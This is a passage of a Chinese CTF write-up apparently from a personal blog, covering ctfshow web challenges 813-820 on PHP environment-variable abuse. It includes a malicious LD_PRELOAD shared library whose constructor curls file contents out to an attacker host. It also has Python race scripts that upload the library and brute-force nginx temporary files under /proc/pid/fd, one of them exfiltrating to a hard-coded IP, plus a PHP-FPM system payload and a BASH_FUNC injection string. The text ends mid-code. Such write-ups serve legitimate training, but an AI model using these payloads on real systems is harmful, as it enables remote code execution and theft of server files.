<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 fpm.py -c <span class="string">&#x27;&lt;?php system(&quot;cat /f*&quot;);?&gt;&#x27;</span> -p 28046 pwn.challenge.ctf.show /usr/<span class="built_in">local</span>/lib/php/System.php</span><br></pre></td></tr></table></figure>
<p>运行得到flag<br>报500了，我没成功（泪目）</p>
<h1 id="web813（劫持mysqli）"><a href="#web813（劫持mysqli）" class="headerlink" title="web813（劫持mysqli）"></a>web813（劫持mysqli）</h1><h2 id="前提条件-1"><a href="#前提条件-1" class="headerlink" title="前提条件"></a>前提条件</h2><p><img src="https://img-blog.csdnimg.cn/83bd15d8124245a6836b0a98d08b18da.png"><br><a target="_blank" rel="noopener" href="https://juejin.cn/post/7093311358426415135#heading-5">大佬博客</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/124038567?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166278060316782417034638%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166278060316782417034638&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-124038567-null-null.142%5Ev47%5Econtrol,201%5Ev3%5Eadd_ask&utm_term=ctfshow811&spm=1018.2226.3001.4187#web813_306">yu师傅博客</a><br>恶意so文件弄出来了，但是却没有成功反弹shell</p>
<h1 id="web814（劫持getuid）"><a href="#web814（劫持getuid）" class="headerlink" title="web814（劫持getuid）"></a>web814（劫持getuid）</h1><h2 id="条件-2"><a href="#条件-2" class="headerlink" title="条件"></a>条件</h2><p><img src="https://img-blog.csdnimg.cn/11562af38def4131b9d36b556808367b.png"></p>
<h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p><a target="_blank" rel="noopener" href="https://shadowfl0w.github.io/LD-PRELOAD%E5%AD%A6%E4%B9%A0/">LD_PRELOAD学习</a><br><img src="https://img-blog.csdnimg.cn/13223f4ef27b43ecb21b9693c3c41792.png"><br><img src="https://img-blog.csdnimg.cn/6b4cee74ee33412c8151a4a7e4bc383a.png"></p>
<p><img src="https://img-blog.csdnimg.cn/00de771d13f5445bb009c4579738d321.png"><br><img src="https://img-blog.csdnimg.cn/3d80243d00fa47fd8e9a36fdf9994de7.png"></p>
<h2 id="过程-1"><a href="#过程-1" class="headerlink" title="过程"></a>过程</h2><p>利用脚本</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span></span>&#123;</span><br><span class="line">        system(<span class="string">&quot;curl http://url:port?s=`cat /*`&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getuid</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>)==<span class="literal">NULL</span>)&#123; <span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line">        unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">        payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>之后进行编译成so文件<br>gcc -c -fPIC xin.c -o xin&amp;&amp;gcc –share xin -o xin.so<br>之后将文件上传到临时目录下，将LD_PRELOAD的路径通过putenv重定向为tmp目录下创建进程执行getuid函数即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;&quot;</span></span><br><span class="line">data=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;/tmp/hack.so&#x27;</span>,<span class="string">&#x27;content&#x27;</span>:<span class="built_in">open</span>(<span class="string">&#x27;hack.so&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()&#125;</span><br><span class="line">requests.post(url+<span class="string">&#x27;?a=write&#x27;</span>,data=data)</span><br><span class="line">requests.get(url+<span class="string">&#x27;?a=run&amp;env=LD_PRELOAD=/tmp/hack.so&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="web815（劫持构造器）"><a href="#web815（劫持构造器）" class="headerlink" title="web815（劫持构造器）"></a>web815（劫持构造器）</h1><p>本题由于存在mail函数因此可以利用第二种方法进行getshell<br>另一种方法：<br>如果利用第二种方法，则<br><img src="https://img-blog.csdnimg.cn/f28964f6f30f4fd29e20eb17d8a23ac6.png"><br>下面的一个比较通用：</p>
<p>在GCC 有个 C 语言扩展修饰符 attribute((constructor))，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行__attribute__((constructor)) 修饰的函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">hack</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;curl http://xxx:4567?s=`cat /*`&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>gcc -c -fPIC xin.c -o xin&amp;&amp;gcc –share xin -o xin.so<br>得到so文件上传拿到shell</p>
<h1 id="web816（临时文件利用）"><a href="#web816（临时文件利用）" class="headerlink" title="web816（临时文件利用）"></a>web816（临时文件利用）</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2022-03-26 14:19:44</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2022-04-27 08:34:06</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$env</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;env&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$env</span>))&#123;</span><br><span class="line">    putenv(<span class="variable">$env</span>.scandir(<span class="string">&quot;/tmp&quot;</span>)[<span class="number">2</span>]);</span><br><span class="line">    system(<span class="string">&quot;echo ctfshow&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>拿到题目后知道应该上传恶意so文件来进行getshell，按时看到题目没有上传点一时无法下手<br>看大佬博客后发现<br>我们将恶意so文件上传上去，会作为临时文件保存到/tmp/目录下<br>然后有$env.scandir(“/tmp”)[2]得到临时文件路径，从而达到利用LD_PRELOAD的环境变量来RCE<br><strong>注意</strong>：一般临时文件上传上去，不好拿到文件名于是利用scandir(“/tmp”)[2]得到文件名<br>上传815产生的so文件，利用脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;url/?env=LD_PRELOAD=/tmp/&quot;</span></span><br><span class="line">files=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="built_in">open</span>(<span class="string">&#x27;hack.so&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()&#125;</span><br><span class="line">response=requests.post(url,files=files)</span><br><span class="line">response=requests.post(url,files=files)</span><br><span class="line">html = response.text</span><br><span class="line"><span class="built_in">print</span>(html)</span><br></pre></td></tr></table></figure>
<h1 id="web817（利用nginx的body-fastcgi缓存机制）"><a href="#web817（利用nginx的body-fastcgi缓存机制）" class="headerlink" title="web817（利用nginx的body/fastcgi缓存机制）"></a>web817（利用nginx的body/fastcgi缓存机制）</h1><p>题目</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; preg_match(<span class="string">&quot;/^\/(\w+\/?)+$/&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">	shell_exec(shell_exec(<span class="string">&quot;cat <span class="subst">$file</span>&quot;</span>));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>考点</strong>：<br>让后端 php 请求一个过大的文件<br>当body过大时，导致 Nginx 需要产生临时文件进行缓存<br>虽然Nginx 删除了/var/lib/nginx/fastcgi下的临时文件，但是在 /proc/pid/fd/ 下我们可以找到被删除的文件<br>遍历 pid 以及 fd ，使用多重链接绕过 PHP 包含策略完成 LFI<br><strong>包含/proc/pid/fd/条件</strong><br><img src="https://img-blog.csdnimg.cn/44869dad812245428be9c02b8b815fca.png"><br><img src="https://img-blog.csdnimg.cn/ef5b1df54a4b412f847343d9ab49e4c6.png"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">&quot;/^\/(\w+\/?)+$/&quot;</span></span><br></pre></td></tr></table></figure>
<p>大概意思就是以/开头，并且后面只能有数字字母和/<br><a target="_blank" rel="noopener" href="https://tttang.com/archive/1384/#toc_0x00">大佬博客</a><br>利用师傅脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  threading, requests</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">port= <span class="number">28053</span></span><br><span class="line">s=socket.socket()</span><br><span class="line">s.connect((<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,port))</span><br><span class="line">s.send(<span class="string">f&#x27;&#x27;&#x27;GET / HTTP/1.1</span></span><br><span class="line"><span class="string">Host:127.0.0.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span>.encode())</span><br><span class="line">data=s.recv(<span class="number">1024</span>).decode()</span><br><span class="line">s.close()</span><br><span class="line">pid = re.findall(<span class="string">&#x27;(.*?) www-data&#x27;</span>,data)[<span class="number">0</span>].strip()</span><br><span class="line"><span class="built_in">print</span>(pid)</span><br><span class="line"></span><br><span class="line">con=<span class="string">&quot;curl http://101.34.94.44:4567?`cat /f*`;&quot;</span>+<span class="string">&#x27;0&#x27;</span>*<span class="number">1024</span>*<span class="number">500</span></span><br><span class="line">l = <span class="built_in">len</span>(con)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>():</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		s=socket.socket()</span><br><span class="line">		s.connect((<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,port))</span><br><span class="line">		x=<span class="string">f&#x27;&#x27;&#x27;POST / HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Length: <span class="subst">&#123;l&#125;</span></span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"><span class="subst">&#123;con&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		&#x27;&#x27;&#x27;</span>.encode()</span><br><span class="line">		s.send(x)</span><br><span class="line">		s.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bruter</span>():</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		<span class="keyword">for</span> fd <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">40</span>):</span><br><span class="line">			<span class="built_in">print</span>(fd)</span><br><span class="line">			s=socket.socket()</span><br><span class="line">			s.connect((<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,port))</span><br><span class="line">			s.send(<span class="string">f&#x27;&#x27;&#x27;GET /?file=/proc/<span class="subst">&#123;pid&#125;</span>/fd/<span class="subst">&#123;fd&#125;</span> HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.encode())</span><br><span class="line">			<span class="built_in">print</span>(s.recv(<span class="number">2048</span>).decode())</span><br><span class="line">			s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    t = threading.Thread(target=upload)</span><br><span class="line">    t.start()</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    a = threading.Thread(target=bruter)</span><br><span class="line">    a.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web818（利用nginx的body缓存机制）"><a href="#web818（利用nginx的body缓存机制）" class="headerlink" title="web818（利用nginx的body缓存机制）"></a>web818（利用nginx的body缓存机制）</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$env</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;env&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$env</span>))&#123;</span><br><span class="line">	putenv(<span class="variable">$env</span>);</span><br><span class="line">	system(<span class="string">&quot;echo ctfshow&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	system(<span class="string">&quot;ps aux&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>原理和817相似<br>利用nginx的body缓存机制<br>上传一个so文件(so文件可以看下815、814）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span>  threading, requests</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">port= <span class="number">28133</span></span><br><span class="line">s=socket.socket()</span><br><span class="line">s.connect((<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,port))</span><br><span class="line">s.send(<span class="string">f&#x27;&#x27;&#x27;GET / HTTP/1.1</span></span><br><span class="line"><span class="string">Host:127.0.0.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span>.encode())</span><br><span class="line">data=s.recv(<span class="number">1024</span>).decode()</span><br><span class="line">s.close()</span><br><span class="line">pid = re.findall(<span class="string">&#x27;(.*?) www-data&#x27;</span>,data)[<span class="number">0</span>].strip()</span><br><span class="line"><span class="built_in">print</span>(pid)</span><br><span class="line">l=<span class="built_in">str</span>(<span class="built_in">len</span>(<span class="built_in">open</span>(<span class="string">&#x27;hack.so&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()+<span class="string">b&#x27;\n&#x27;</span>*<span class="number">1024</span>*<span class="number">200</span>)).encode()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>():</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		s=socket.socket()</span><br><span class="line">		s.connect((<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,port))	</span><br><span class="line">		x=<span class="string">b&#x27;&#x27;&#x27;POST / HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">User-Agent: yu22x</span></span><br><span class="line"><span class="string">Content-Length: &#x27;&#x27;&#x27;</span>+l+<span class="string">b&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>+<span class="built_in">open</span>(<span class="string">&#x27;hack.so&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()+<span class="string">b&#x27;\n&#x27;</span>*<span class="number">1024</span>*<span class="number">200</span>+<span class="string">b&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">		s.send(x)</span><br><span class="line">		s.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bruter</span>():</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		<span class="keyword">for</span> fd <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">40</span>):</span><br><span class="line">			<span class="built_in">print</span>(fd)</span><br><span class="line">			s=socket.socket()</span><br><span class="line">			s.connect((<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,port))</span><br><span class="line">			s.send(<span class="string">f&#x27;&#x27;&#x27;GET /?env=LD_PRELOAD=/proc/<span class="subst">&#123;pid&#125;</span>/fd/<span class="subst">&#123;fd&#125;</span> HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">User-Agent: yu22x</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.encode())</span><br><span class="line">			<span class="built_in">print</span>(s.recv(<span class="number">2048</span>).decode())</span><br><span class="line">			s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    t = threading.Thread(target=upload)</span><br><span class="line">    t.start()</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    a = threading.Thread(target=bruter)</span><br><span class="line">    a.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web819（利用bash的匿名函数环境变量）"><a href="#web819（利用bash的匿名函数环境变量）" class="headerlink" title="web819（利用bash的匿名函数环境变量）"></a>web819（利用bash的匿名函数环境变量）</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2022-04-28 16:55:29</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2022-04-29 19:51:56</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$env</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;env&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$env</span>))&#123;</span><br><span class="line">    putenv(<span class="variable">$env</span>);</span><br><span class="line">    system(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得到题目发现与818题目差不多，一个时pwn形式，一个http形式<br>当利用http形式时我们无法利用nginx的body缓存机制，原因时没办法让他听起来</p>
<p>于是这里就可以利用bash的匿名函数环境变量</p>
<p>为了修复破壳漏洞<br>官方规定<br><img src="https://img-blog.csdnimg.cn/c0f1d8e9d23942c69010988bedf48bcc.png"><br>同时我们了解到</p>
<blockquote>
<p>system()会调用fork()产生子进程，由子进程来调用/bin/sh-c string来执行参数string字符串所代表的命令<br>system()会继承环境变量，通过环境变量可能会造成系统安全的问题<br>于是我们可以构造环境变量构造whoami函数，利用system来进行移花接木</p>
</blockquote>
<p>这样利用要有前提，即sh -c所代表的要为bash命令<br><img src="https://img-blog.csdnimg.cn/ae7eee28feab4d3ba98d17cdfc12e8e8.png"><br>于是构造命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?env=BASH_FUNC_whoami%%=() &#123; nl /flag;&#125;</span><br></pre></td></tr></table></figure>
<p>总结：<br><img src="https://img-blog.csdnimg.cn/5c853353fb2c44cf9f48d7c272b101b8.png"></p>
<h1 id="web820（base64图片码）"><a href="#web820（base64图片码）" class="headerlink" title="web820（base64图片码）"></a>web820（base64图片码）</h1><p>base64的小介绍<br><img src="https://img-blog.csdnimg.cn/fef1381e13fd4eb08af848ae1cfc49c5.png"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2022-04-30 10:52:40</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2022-04-30 16:59:27</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>])&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmpname</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$ef</span> = 